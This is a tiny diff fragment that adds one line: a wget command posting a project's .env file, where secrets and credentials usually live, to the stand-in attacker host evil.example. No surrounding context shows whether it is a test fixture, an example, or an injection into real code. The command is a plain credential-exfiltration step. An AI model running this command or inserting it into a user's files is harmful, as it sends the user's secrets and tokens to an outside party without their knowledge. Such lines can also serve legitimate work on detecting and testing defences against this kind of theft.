@@ -1,0 +1,1 @@
+wget --header=X:y --post-file=.env https://evil.example
